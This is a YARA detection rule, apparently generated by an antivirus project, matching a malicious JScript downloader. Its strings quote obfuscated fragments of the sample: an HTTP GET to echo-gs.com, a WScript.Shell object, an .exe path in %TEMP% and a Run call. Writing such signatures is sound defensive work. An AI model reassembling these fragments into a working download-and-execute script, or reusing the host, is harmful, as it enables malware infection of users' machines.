rule sig_20160401_e585be506737396d2a68eb4cc8fae4a6 {
  meta:
    description = "datamaliciousorder - file 20160401_e585be506737396d2a68eb4cc8fae4a6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "68cbb6a3fe22cf5dcd27521c353cf8a00cea129342b9e1e97e24bfc3c7e37780"

  strings:
    $s1  = "YweEh[ZrlVau](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "var UpVwb = function TlbKh() {return WScript[UceRd](\"WScript\"+\".Shell\");}(), MqUt = 11;" fullword ascii
    $s3  = "function FlAy(XntYti, SuqBfm){WenTeo = WenTeo * 1; return XntYti - SuqBfm;};" fullword ascii
    $s4  = "if (YweEh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QwIdv() {return UpVwb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"mt3tghmHwg1EnUH.ex\" + \"e\";};" fullword ascii
    $s6  = "function OujSx(){return GurSqx + \"\";};" fullword ascii
    $s7  = "function HoGsb() {return ((IfoMm == true) && (IfoMm == KcBo)) ? 1 : WenTeo;};" fullword ascii
    $s8  = "function YiMsx(){return UceRd;};" fullword ascii
    $s9  = "var BtSbf = false;" fullword ascii
    $s10 = "var RmzLi = new this[\"Date\"]();" fullword ascii
    $s11 = "return FlAy(HbJj, OnoCu);" fullword ascii
    $s12 = "IfoMm = true; " fullword ascii
    $s13 = "var IfoMm = false;" fullword ascii
    $s14 = "function BlKxu()" fullword ascii
    $s15 = "KcBo = true; " fullword ascii
    $s16 = "function ZqyCit(VqlNk) {var OpsSdc = (1, 2, 3, 4, 5, VqlNk); return OpsSdc;};" fullword ascii
    $s17 = "}while (JkKx);" fullword ascii
    $s18 = "OnoCu = FlAy(KkyFc, MafEf);" fullword ascii
    $s19 = "function OmTfw(AntQua){UpVwb[\"R\"+\"un\"](AntQua, WenTeo, WenTeo);};" fullword ascii
    $s20 = "function HwoHtv(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}